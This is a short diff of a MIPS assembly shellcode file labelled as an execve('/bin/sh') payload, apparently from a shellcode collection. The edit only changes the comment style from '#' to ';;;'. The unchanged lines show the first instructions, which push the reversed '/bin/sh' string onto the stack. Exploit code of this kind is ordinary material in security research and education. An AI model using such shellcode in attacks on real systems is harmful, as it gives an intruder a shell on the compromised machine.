@@ -1,8 +1,8 @@
-#
-# MIPS sys_execve("/bin/sh") shellcode
-#
-# @_hugsy_
-#
+;;;
+;;; MIPS sys_execve("/bin/sh") shellcode
+;;;
+;;; @_hugsy_
+;;;
 li $v0, "nib/"
 sw $v0, 0($sp)
 li $v0, "hs//"
